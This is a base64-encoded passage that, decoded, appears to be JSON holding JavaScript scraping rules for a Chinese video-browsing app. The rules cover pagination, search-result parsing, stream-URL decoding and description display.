XJhbXMpIHtcXG4gICAgdmFyIHUxID0gdGhpcy51cmxQYXJzZShzb3VyY2UpO1xcbiAgICB2YXIgdTIgPSB0aGlzLnVybFBhcnNlKHRhcmdldCk7XFxuICAgIHZhciBwYSA9IHVuZGVmaW5lZDtcXG4gICAgaWYgKHR5cGVvZiBwYXJhbXMgPT0gXFxcIm9iamVjdFxcXCIpIHtcXG4gICAgICBwYSA9IHBhcmFtcy5oYXNPd25Qcm9wZXJ0eShcXFwi54m55b6BXFxcIikgPyBwYXJhbXMu54m55b6BIDogdW5kZWZpbmVkO1xcbiAgICB9XFxuICAgIHZhciBuZXh0dXJsID0gc291cmNlO1xcbiAgICB2YXIgY2EgPSBPYmplY3Qua2V5cyh1Mi5QYXJhbXMpLmxlbmd0aCA9PSAwID8gXFxcIlxcXCIgOiBcXFwiP1xcXCI7XFxuICAgIGlmIChwYSAhPSB1bmRlZmluZWQpIHtcXG4gICAgICB2YXIgcnMgPSBTdHJpbmcodTIuUGF0aCkucmVwbGFjZShuZXcgUmVnRXhwKHBhKSwgXFxcIiQxZnlwYWdlXFxcIik7XFxuICAgICAgbmV4dHVybCA9IHUyLkhvc3RzICsgcnMgKyBjYSArIHRoaXMuVG9QYXJhbXModTIuUGFyYW1zKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICBpZiAodGhpcy5pc0VxdWFsKHUxLlBhcmFtcywgdTIuUGFyYW1zKSkge1xcbiAgICAgICAgaWYoZHRfZGVidWcpe1xcbiAgICAgICAgbG9nKHUxLlBhdGgpO1xcbiAgICAgICAgbG9nKHUyLlBhdGgpO1xcbiAgICAgICAgfVxcbiAgICAgICAgdmFyIGRmID0gdGhpcy5maW5kRGlmZmVyZW50SW5kZXgoU3RyaW5nKHUxLlBhdGgpLCBTdHJpbmcodTIuUGF0aCkpO1xcbiAgICAgICAgaWYoZHRfZGVidWcpe1xcbiAgICAgICAgbG9nKGRmKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChkZi5sZW5ndGggPT0gMSkge1xcbiAgICAgICAgICB2YXIgcmUgPSBkZlswXS5pbmRleDtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgIHZhciBmID0gZGYuZmlsdGVyKCh4KSA9PiAvXFxcXGQrLy50ZXN0KHguczIpKTtcXG4gICAgICAgICAgdmFyIHJlID0gZlswXS5pbmRleDtcXG4gICAgICAgIH1cXG4gICAgICAgIHZhciBlcSA9IHRoaXMucmVwbGFjZUNoYXJBdChTdHJpbmcodTIuUGF0aCksIHJlLCBcXFwiZnlwYWdlXFxcIik7XFxuICAgICAgICBuZXh0dXJsID0gdTIuSG9zdHMgKyBlcSArIGNhICsgdGhpcy5Ub1BhcmFtcyh1Mi5QYXJhbXMpO1xcbiAgICAgIH0gZWxzZSB7XFxuICAgICAgICB2YXIgZXA9dGhpcy5nZXRPYmplY3RLZXlzRGlmZih1MS5QYXJhbXMsdTIuUGFyYW1zKVxcbiAgICAgICAgaWYoZXAubGVuZ3RoPT0xKXtcXG4gICAgICAgICAgdTEuUGFyYW1zW2VwWzBdXT0nZnlwYWdlJ1xcbiAgICAgICAgfWVsc2V7XFxuICAgICAgICAgIGxvZyhlcCk7XFxuICAgICAgICB9XFxuICAgICAgICB2YXIgZXEgPSBTdHJpbmcodTEuUGF0aCkucmVwbGFjZSgvXFxcXGQrLywgXFxcImZ5cGFnZVxcXCIpO1xcbiAgICAgICAgbmV4dHVybCA9IHUxLkhvc3RzICsgZXEgKyBjYSArIHRoaXMuVG9QYXJhbXModTEuUGFyYW1zKTtcXG4gICAgICB9XFxuICAgIH1cXG4gICAgLy9sb2coJ25leHQ6JytuZXh0dXJsKVxcbiAgICByZXR1cm4gbmV4dHVybDtcXG4gIH0sXFxufTtcXG5cXG5mdW5jdGlvbiBnZXRUcnVlbGluayhtYXJrLCB1cmwsIHBhZ2UpIHtcXG4gIHZhciBwID0gZ2V0TXlWYXIobWFyaywgdXJsKS5yZXBsYWNlKFxcXCJmeXBhZ2VcXFwiLCBwYWdlKTtcXG4gIGlmIChwYWdlID09IDEpIHtcXG4gICAgcmV0dXJuIGdldE15VmFyKFxcXCJ5aV9maXJzdHBhZ2VcXFwiLCBwKTtcXG4gIH0gZWxzZSBpZiAocCAhPSBcXFwiXFxcIikge1xcbiAgICByZXR1cm4gcDtcXG4gIH0gZWxzZSB7XFxuICAgIHJldHVybiB1cmw7XFxuICB9XFxufVxcbi8v5p6E5bu6XFxuZnVuY3Rpb24gY3JlYXRlTmV4dFBhZ2UoKSB7XFxuICBsZXQgc3RhcnRudW0gPSAxO1xcbiAgdmFyIG9iaiA9IGFyZ3VtZW50c1swXTtcXG4gIGlmICh0cnVlX3VybCAhPSBnZXRNeVZhcihcXFwieWlfcGFnZXVybFxcXCIsIFxcXCJcXFwiKSkge1xcbiAgICBjbGVhck15VmFyKFxcXCJ5aV9wYWdldXJsXFxcIik7XFxuICB9XFxuICBpZiAocGFnZSA9PSBzdGFydG51bSAmJiBnZXRNeVZhcihcXFwieWlfcGFnZXVybFxcXCIpID09IFxcXCJcXFwiKSB7XFxuICAgIHB1dE15VmFyKFxcXCJ5aV9maXJzdHBhZ2VcXFwiLCB0cnVlX3VybCk7XFxuICAgIHRyeSB7XFxuICAgICAgdmFyIG5leHQgPSBldmFsKOS4i+S4gOmhtSk7XFxuICAgICAgLy9sb2coXFxcIm5leHRcXFwiKTtcXG4gICAgICAvL2xvZyhuZXh0KTtcXG4gICAgfSBjYXRjaCB7XFxuICAgICAgbG9nKFxcXCLlj6/og73kuI3lrZjlnKjkuIvkuIDpobXmiJbogIXkuIvkuIDpobXlrprkvY3mnInpl67pophcXFwiKTtcXG4gICAgICBuZXh0ID0gXFxcIlxcXCI7XFxuICAgIH1cXG4gICAgaWYgKG5leHQgIT0gXFxcIlxcXCIpIHtcXG4gICAgICB2YXIgbnh1cmwgPSBleHRNZXRob2QuZ2V0TmV4dFVybCh0cnVlX3VybCwgbmV4dCwgb2JqKTtcXG4gICAgICAvL2xvZyhcXFwibnh1cmw6XFxcIiArIG54dXJsKTtcXG4gICAgICBwdXRNeVZhcijnirbmgIEsIG54dXJsKTtcXG4gICAgICBwdXRNeVZhcihcXFwieWlfcGFnZXVybFxcXCIsIG54dXJsKTtcXG4gICAgfVxcbiAgfVxcbn1cXG5cXG5mdW5jdGlvbiBhdXRvUGFnZSgpIHtcXG4gIGlmKHBhZ2U9PTEpe1xcbiAgICBwdXRNeVZhcihcXFwieWlfZmlyc3RwYWdlXFxcIiwgdHJ1ZV91cmwpO1xcbiAgICB9XFxuICAgIHRyeSB7XFxuICAgICAgdmFyIG5leHQgPSBldmFsKOS4i+S4gOmhtSk7XFxuICAgICAgLy9sb2coXFxcIm5leHRcXFwiKTtcXG4gICAgICAvL2xvZygnbmV4dDonK25leHQpO1xcbiAgICB9IGNhdGNoIHtcXG4gICAgICBsb2coXFxcIuWPr+iDveS4jeWtmOWcqOS4i+S4gOmhteaIluiAheS4i+S4gOmhteWumuS9jeaciemXrumimFxcXCIpO1xcbiAgICAgIG5leHQgPSBcXFwiXFxcIjtcXG4gICAgfVxcbiAgICBpZiAobmV4dCAhPSBcXFwiXFxcIikge1xcbiAgICAgIHB1dE15VmFyKOeKtuaAgSwgbmV4dCk7XFxuICAgIH1cXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkuIDnuqfmkJzntKLpobXpnaJcIixcInBhdGhcIjpcIlNlYXJjaEZyYW1lXCIsXCJydWxlXCI6XCJcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3l6bScpKS5ydWxlKVxcbmxldCBsaXN0ID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCDmoYbmnrbliJfooagpO1xcbmZvciAobGV0IGogaW4gbGlzdCkge1xcbiAgICAgdmFyIOagh+mimCA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCDmoYbmnrbmoIfpopgpLnNsaWNlKDAsMTYpO1xcbiAgICAgdmFyIOeugOS7izEgPSBwYXJzZURvbUZvckh0bWwobGlzdFtqXSwg5qGG5p62566A5LuLMSkuc2xpY2UoMCwyNCk7XFxuICAgICB2YXIg566A5LuLMiA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCDmoYbmnrbnroDku4syKTtcXG4gICAgIHZhciDmj4/ov7AxID0gcGFyc2VEb21Gb3JIdG1sKGxpc3Rbal0sIOahhuaetuaPj+i/sDEpO1xcbiAgICAgdmFyIOaPj+i/sDIgPSBwYXJzZURvbUZvckh0bWwobGlzdFtqXSwg5qGG5p625o+P6L+wMik7XFxuICAgICB2YXIg5Zu+54mHID0gcGFyc2VEb20obGlzdFtqXSwg5qGG5p625Zu+54mHKSArICdAUmVmZXJlcj1odHRwczovL2ltZzkuZG91YmFuaW8uY29tLyc7XFxuICAgICB2YXIg6ZO+5o6lID0gcGFyc2VEb20obGlzdFtqXSwg5qGG5p626ZO+5o6lKSArIFxcXCIjaW1tZXJzaXZlVGhlbWUjXFxcIjtcXG4gICAgICBcXG4gICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgdGl0bGU6IOagh+mimCwgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgIGNvbnRlbnQ6IOeugOS7izEgKyAnXFxcXG4nICsg566A5LuLMixcXG4gICAgICAgICAgICAgICBkZXNjOiDmj4/ov7AxICsgJyAnICsg5o+P6L+wMixcXG4gICAgICAgICAgICAgICBpbWc6IOWbvueJhyxcXG4gICAgICAgICAgICAgICB1cmw6IOmTvuaOpSxcXG4gICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIHRpdGxlOiDmoIfpopgsICAgICAgICAgICBcXG4gICAgICAgICAgICBpbWc6IOWbvueJhyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcblwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5LqM57qn5aSW6YOo5pCc57SiXCIsXCJwYXRoXCI6XCJ0b29sXCIsXCJydWxlXCI6XCIvL3ZhciB0aXRsZSA9IHBhcnNlRG9tRm9ySHRtbChodG1sLCDmkJzntKLmoIfnrb4pO1xcbnZhciB0aXRsZSA9IE1ZX1BBUkFNUy50aXRsZTtcXG5sb2codGl0bGUpXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfigJjigJjigJnigJk8Yj48bWlkZGxlPjxmb250IGNvbG9yPVxcXCIjRkYwMDAwXFxcIj4g6IGa5b2x4oiaPC9mb250PjwvbWlkZGxlPicsXFxuICAgIHBpY191cmw6ICdodHRwOi8vaW1hZ2UuY29vbGFway5jb20vL2Fwa19sb2dvLzIwMjIvMDUwNy8xNC8wXzM4MjhfNzI1NF82MzlAMjYweDI2MC5wbmcudC5wbmcnLFxcbiAgICB1cmw6ICdoaWtlcjovL3NlYXJjaD9zPScgKyB0aXRsZSArICcmcnVsZT3ogZrlvbHiiJonLFxcbiAgICBjb2xfdHlwZTogJ2ljb25fc21hbGxfNCcsXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfigJjigJjigJnigJk8Yj48bWlkZGxlPjxmb250IGNvbG9yPVxcXCIjMUU5MEZGXFxcIj4g5LqR55uY5ZCbKOaOqOmAgSk8L2ZvbnQ+PC9taWRkbGU+JyxcXG4gICAgcGljX3VybDogJ2h0dHA6Ly9pbWFnZS5jb29sYXBrLmNvbS9hcGtfbG9nby8yMDIxLzA3MjEvMTAvYmI1YzZkNTlhOWUzNjE1OTgzNGIzZjE5ZmM3NDlkZjUtMjg1MTA3LW9fMWZiM2Z0bDNnY3N0MXNkdDFuM2IxbTJ1bmpkMTgtdWlkLTY2MjQzNUAzNjB4MzYwLnBuZycsXFxuICAgIHVybDogJ2hpa2VyOi8vc2VhcmNoP3M9JyArIHRpdGxlICsgJyZydWxlPeS6keebmOWQmyjmjqjpgIEpJyxcXG4gICAgY29sX3R5cGU6ICdpY29uX3NtYWxsXzQnLFxcbn0pO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiAn4oCY4oCY4oCZ4oCZPGI+PG1pZGRsZT48Zm9udCBjb2xvcj1cXFwiI0ZGOEMwMFxcXCI+IOmmmeaDheW9seinhjwvZm9udD48L21pZGRsZT4nLFxcbiAgICBwaWNfdXJsOiAnaHR0cDovL3N0YXRpYy55aW5neW9uZ2h1aS5jb20vaWNvbi8xMjgvNjg2MzQ0Ny5wbmcnLFxcbiAgICB1cmw6ICdoaWtlcjovL3NlYXJjaD9zPScgKyB0aXRsZSArICcmcnVsZT3pppnmg4XlvbHop4YnLFxcbiAgICBjb2xfdHlwZTogJ2ljb25fc21hbGxfNCcsXFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfigJjigJjigJnigJk8Yj48bWlkZGxlPjxmb250IGNvbG9yPVxcXCIjMDBGRjAwXFxcIj4g6Z2S6LGGPC9mb250PjwvbWlkZGxlPicsXFxuICAgIHBpY191cmw6ICdodHRwOi8vc3RhdGljLnlpbmd5b25naHVpLmNvbS9pY29uLzEyOC83MDAwNDc4LnBuZycsXFxuICAgIHVybDogJ2hpa2VyOi8vc2VhcmNoP3M9JyArIHRpdGxlICsgJyZydWxlPemdkuixhicsXFxuICAgIGNvbF90eXBlOiAnaWNvbl9zbWFsbF80JyxcXG59KTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6jOe6p+mhtemdouWGheWuuVwiLFwicGF0aFwiOlwiZXJcIixcInJ1bGVcIjpcImpzOlxcbi8qdmVyIDIwMjMwNzA4IDEuMFxcbiAqL1xcbnZhciBjdXN0b209e307XFxuXFxuLy/pooTorr5cXG5mdW5jdGlvbiBjdXN0b21EYXRhKGN1c3RvbSkge1xcbiAgICBPYmplY3Qua2V5cyhjdXN0b20pLmZvckVhY2goKGspPT4ge1xcbiAgICAgIHRoaXNba109Y3VzdG9tW2tdIDtcXG4gICAgfSlcXG59XFxuIFxcbmxldCBFcmppID0ge1xcbiAgICDpgJrlhY06ICQoJycpLmxhenlSdWxlKCgpID0+IHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgdmFyIGh0bWwgPSBKU09OLnBhcnNlKHJlcXVlc3QoaW5wdXQpLm1hdGNoKC9yIHBsYXllcl8uKj89KC4qPyk8LylbMV0pXFxuICAgICAgICAgICAgdmFyIHVybCA9IGh0bWwudXJsXFxuICAgICAgICAgICAgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMScpIHtcXG4gICAgICAgICAgICAgICAgdXJsID0gdW5lc2NhcGUodXJsKTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMicpIHtcXG4gICAgICAgICAgICAgICAgdXJsID0gdW5lc2NhcGUoYmFzZTY0RGVjb2RlKHVybCkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAoL20zdTh8bXA0Ly50ZXN0KHVybCkpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHVybFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidmlkZW86Ly9cXFwiICsgaW5wdXRcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ2aWRlbzovL1xcXCIgKyBpbnB1dFxcbiAgICAgICAgfVxcbiAgICB9KSxcXG4gICAgdXBkYXRhOiBmdW5jdGlvbihydWxlKSB7XFxuICAgICAgICBzZXRMYXN0Q2hhcHRlclJ1bGUoJ2pzOicgKyAkLnRvU3RyaW5nKCh1cmwscnVsZSkgPT4ge1xcbiAgICAgICAgICAgIHZhciBodG1sPWZldGNoKHVybCk7XFxuICAgICAgICAgICAgc2V0UmVzdWx0KGV2YWwocnVsZSkpXFxuICAgICAgICB9LE1ZX1VSTCwgcnVsZSkpXFxuICAgIH0sXFxuICAgIGNsb3NlOiBmdW5jdGlvbihsaXN0LCBzb3J0cykge1xcbiAgICAgICAgYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCAkLnRvU3RyaW5nKChsaXN0LCBzb3J0cykgPT4ge1xcbiAgICAgICAgICAgIGxpc3QubWFwKHggPT4ge1xcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKCdlcl8nICsgeCArICdmb2xkJyk7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoJ2VyXycreCk7XFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNvcnRzOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcigncGxheWxpc3RfJyArIGkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBjbGVhck15VmFyKCdlcl9wbGF5bGlzdHMnKTtcXG4gICAgICAgIH0sIGxpc3QsIHNvcnRzKSlcXG4gICAgfSxcXG4gICAgZGF0YUNvbnZlcnQ6IGZ1bmN0aW9uKGRhdGEpIHtcXG4gICAgICAgIHZhciBuZXdjbHNsaXN0ID0gZGF0YS5tYXAoZnVuY3Rpb24ob2JqKSB7XFxuICAgICAgICAgICAgdmFyIG5ld09iaiA9IE9iamVjdC5hc3NpZ24oe30sIG9iaik7XFxuICAgICAgICAgICAgaWYgKG5ld09iai5oYXNPd25Qcm9wZXJ0eSgndHlwZScpKSB7XFxuICAgICAgICAgICAgICAgIG5ld09iai5jb2xfdHlwZSA9IG5ld09iai50eXBlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gbmV3T2JqO1xcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gbmV3Y2xzbGlzdDtcXG4gICAgfSxcXG4gICAgcHJlTG9hZDogZnVuY3Rpb24oZnVuYykge1xcbiAgICAgICAgbGV0IG15ZnVuYz1udWxsXFxuICAgICAgICBpZihmdW5jIT11bmRlZmluZWQmJmZ1bmMuY29uc3RydWN0b3I9PUZ1bmN0aW9uKXtcXG4gICAgICAgICAgICBteWZ1bmM9ZnVuY1xcbiAgICAgICAgfVxcbiAgICAgICAgJC5leHRlbmQoe1xcbiAgICAgICAgICAgIGRhdGFDb252ZXJ0OiB0aGlzLmRhdGFDb252ZXJ0LFxcbiAgICAgICAgICAgIG1zbTpNZXRob2RzLk11bHRpU2VsZWN0TW9kZSxcXG4gICAgICAgICAgICBmdW5jOm15ZnVuYyxcXG4gICAgICAgIH0pXFxuICAgIH0sXFxuICAgIHNtYWxsOiBmdW5jdGlvbihzdHIsIGNvbG9yKSB7XFxuICAgICAgICByZXR1cm4gJ+KAmOKAmOKAmeKAmTxzbWFsbD48Zm9udCBjb2xvcj1cXFwiJyArIChjb2xvciB8fCAnJykgKyAnXFxcIj4nICsgc3RyICsgJzwvZm9udD48L3NtYWxsPic7XFxuICAgIH0sXFxuICAgIOWjsOaYjjogZnVuY3Rpb24oKSB7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiB0aGlzLnNtYWxsKCfku6XkuIrmlbDmja7mnaXmupDkuo7nvZHnu5zvvIzlpoLmgqjllpzmrKLvvIzor7fmlK/mjIHlrpjmlrnvvIEnLCAnIzg3MUY3OCcpLFxcbiAgICAgICAgICAgIGRlc2M6IHRoaXMuc21hbGwoJ+atpOinhOWImeS7hemZkOWtpuS5oOS6pOa1geS9v+eUqO+8jOivt+S6juWvvOWFpeWQjjI05bCP5pe25YaF5Yig6Zmk77yM5Lu75L2V57uE57uH5oiW5Liq5Lq65LiN5b6X5Lul5Lu75L2V5pa55byP5pa55rOV5Lyg5pKt5q2k6KeE5YiZ55qE5pW05L2T5oiW6YOo5YiG77yBJywgJyNGMjBDMDAnKSxcXG4gICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxuICAgICAgICB9KTtcXG4gICAgfSxcXG5cXG5cXG4vL+eugOS7i1xcbiAgICBzZXREZXNjOiBmdW5jdGlvbihkZXNjLCBudW0pIHtcXG4gICAgICAgIGRlc2MgPSBkZXNjLmNvbnN0cnVjdG9yID09IEFycmF5ID8gZGVzYy5qb2luKCc8YnI+JykgOiBkZXNjO1xcbiAgICAgICAgaWYgKGRlc2MucmVwbGFjZSgvKDxicj58XFxcXHMrKS9nLCAnJykubGVuZ3RoID09IDApIHtcXG4gICAgICAgICAgICByZXR1cm5cXG4gICAgICAgIH1cXG4gICAgICAgIHZhciBpbmZvPXN0b3JhZ2UwLmdldE15VmFyKCdlcl9pbmZvJywne30nKVxcbiAgICAgICAgaWYoaW5mb1snZGVzYyddIT11bmRlZmluZWQpe1xcbiAgICAgICAgICBpbmZvWydkZXNjJ109aW5mb1snZGVzYyddKycg566A5LuLOicrZGVzYztcXG4gICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ2VyX2luZm8nLGluZm8pO1xcbiAgICAgICAgfVxcbiAgICAgICAgXFxuICAgICAgICBjb25zdCBtYXJrID0gJ2Rlc2MnO1xcbiAgICAgICAgbnVtID0gdHlwZW9mKG51bSkgPT0gJ3VuZGVmaW5lZCcgPyA5MCA6IG51bVxcbiAgICAgICAgZGVzYyA9IGRlc2Muc3RhcnRzV2l0aCgn44CA44CAJykgPyBkZXNjIDogJ+OAgOOAgCcgKyBkZXNjO1xcbiAgICAgICAgZGVzYyA9IGRlc2MucmVwbGFjZSgvJy9nLCBcXFwiJiMzOTtcXFwiKVxcblxcbiAgICAgICAgZnVuY3Rpb24gc3Vic3RyKHN0ciwgbWF4TGVuZ3RoKSB7XFxuICAgICAgICAgICAgbGV0IGxlbiA9IDA7XFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgaWYgKHN0ci5jaGFyQ29kZUF0KGkpID4gMjU1KSB7XFxuICAgICAgICAgICAgICAgICAgICBsZW4gKz0gMjtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGxlbisrO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmIChsZW4gPiBtYXhMZW5ndGgpIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHIuc2xpY2UoMCwgaSkgKyAnLi4uJztcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gc3RyO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IHNkZXNjID0gc3Vic3RyKGRlc2MsIG51bSk7XFxuICAgICAgICB2YXIgbGF6eSA9ICQoYCNub0xvYWRpbmcjYCkubGF6eVJ1bGUoKGRjLCBzZGMsIG0pID0+IHtcXG4gICAgICAgICAgICB2YXIgc2hvdyA9IHN0b3JhZ2UwLmdldEl0ZW0obSwgJzAnKTtcXG4gICAgICAgICAgICB2YXIgdGl0bGUgPSBmaW5kSXRlbSgnZGVzYycpLnRpdGxlO1xcbiAgICAgICAgICAgIHZhciByZSA9IC8oPFxcXFwvc21hbGw+PGJyPi4qPz4pLisvZztcXG4gICAgICAgICAgICB2YXIgZXhwID0gJ+WxleW8gDonO1xcbiAgICAgICAgICAgIHZhciByZXQgPSAn5pS26LW3Oic7XFxuICAgICAgICAgICAgaWYgKHNob3cgPT0gJzEnKSB7XFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oJ2Rlc2MnLCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGVcXG4gICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZShyZXQsIGV4cClcXG4gICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZShyZSwgJyQxJyArIHNkYyArICc8L3NtYWxsPicpXFxuICAgICAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyg8XFxcXC9zbWFsbD48YnI+PGZvbnQgY29sb3I9XFxcIikuKj8oXFxcIj4pLywgJyQxIzhBMkJFMiQyJykvL+aUtui1t+minOiJslxcblxcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKG0sICcwJyk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbSgnZGVzYycsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZVxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKGV4cCwgcmV0KVxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKHJlLCAnJDEnICsgZGMgKyAnPC9zbWFsbD4nKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8oPFxcXFwvc21hbGw+PGJyPjxmb250IGNvbG9yPVxcXCIpLio/KFxcXCI+KS8sICckMSMwMDgwMDAkMicpLy/lsZXlvIDpopzoibJcXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShtLCAnMScpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gYGhpa2VyOi8vZW1wdHlgXFxuICAgICAgICB9LCBkZXNjLCBzZGVzYywgbWFyaylcXG4gICAgICAgIHZhciBzYyA9IHN0b3JhZ2UwLmdldEl0ZW0obWFyaywgJzAnKSA9PSAnMCcgPyAn5bGV5byAOicgOiAn5pS26LW3Oic7XFxuICAgICAgICB2YXIgZGMgPSBzdG9yYWdlMC5nZXRJdGVtKG1hcmssICcwJykgPT0gJzAnID8gc2Rlc2MgOiBkZXNjO1xcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAnJyArICc8Yj48Zm9udCBjb2xvcj1cXFwiIzA5OEFDMVxcXCI+4oi3ICDliafmg4XnroDku4tcXHQ8L2ZvbnQ+PC9iPicgKyBcXFwiPHNtYWxsPjxhIHN0eWxlPSd0ZXh0LWRlY29yYXRpb246IG5vbmU7JyBocmVmPSdcXFwiICsgbGF6eSArIFxcXCInPlxcXCIgKyBzYyArICc8L2E+PC9zbWFsbD48YnI+PGZvbnQgY29sb3I9XFxcIiM4QTJCRTJcXFwiPicgKyBgJHtkY31gICsgJzwvc21hbGw+JywvL+m7mOiupOminOiJslxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogJ2Rlc2MnLFxcbiAgICAgICAgICAgICAgICBsaW5lU3BhY2luZzogNixcXG4gICAgICAgICAgICAgICAgdGV4dFNpemU6IDE1LFxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogdHJ1ZSxcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICB9LFxcblxcblxcbi8v5rW35oqlXFxuICAgIHN0ckNvbnZlcnQ6IGZ1bmN0aW9uKGFycikge1xcbiAgICAgICAgcmV0dXJuIGFyci5tYXAoeCA9PiB7XFxuICAgICAgICAgICAgc3RyID0geDtcXG4gICAgICAgICAgICBpZiAoLyjlr7zmvJR85Li75ryUfOexu+WeiynvvJovLnRlc3Qoc3RyKSkge1xcbiAgICAgICAgICAgICAgICBzdHIgPSBzdHIuc3BsaXQoJy8nKS5tYXAoKHZhbCwgaW5kZXgpID0+IChpbmRleCA9PT0gMCA/ICcnIDogJycpICsgdmFsKS5zbGljZSgwLCA1KS5qb2luKCcgJykucmVwbGFjZSgvICQvLCAnJyk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBzdHJcXG4gICAgICAgIH0pXFxuICAgIH0sXFxuICAgIHNldENvbnRlbnQ6IGZ1bmN0aW9uKG9iaikge1xcbiAgICAgICAgLy9sb2cob2JqKVxcbiAgICAgICAgdmFyIGNvbnRlbnRzID0gb2JqLm1haW47XFxuICAgICAgICB2YXIgc29ydE9yZGVyID0gb2JqLnNvcnQ7XFxuICAgICAgICB2YXIgaW1nID0gb2JqLmltZztcXG4gICAgICAgIHZhciB0ZXh0cyA9IGNvbnRlbnRzLm1hcCh4ID0+IHBkZmgoeCwgJ1RleHQnKSk7XFxuICAgICAgICBcXG4gICAgICAgIHZhciBhcnJheSA9IHRleHRzLnNvcnQoKGEsIGIpID0+IHtcXG4gICAgICAgICAgICBjb25zdCBpbmRleEEgPSBzb3J0T3JkZXIuaW5kZXhPZihhLnN1YnN0cigwLCAyKSk7XFxuICAgICAgICAgICAgY29uc3QgaW5kZXhCID0gc29ydE9yZGVyLmluZGV4T2YoYi5zdWJzdHIoMCwgMikpO1xcbiAgICAgICAgICAgIHJldHVybiBpbmRleEEgLSBpbmRleEI7XFxuICAgICAgICB9KVxcbiAgICAgICAgdmFyIHJlZ2V4ID0gbmV3IFJlZ0V4cCgnKCcgKyBzb3J0T3JkZXIuam9pbignfCcpICsgJyknKTtcXG4gICAgICAgIGFycmF5ID0gYXJyYXkuZmlsdGVyKGZ1bmN0aW9uKGl0ZW0pIHtcXG4gICAgICAgICAgICByZXR1cm4gcmVnZXgudGVzdChpdGVtKTtcXG4gICAgICAgIH0pO1xcbiAgICAgICAgLy9sb2coYXJyYXkpXFxuICAgICAgICBcXG4gICAgICAgIC8vYXJyYXkgPSBzb3J0T3JkZXIubGVuZ3RoPT0wP2FycmF5OnRo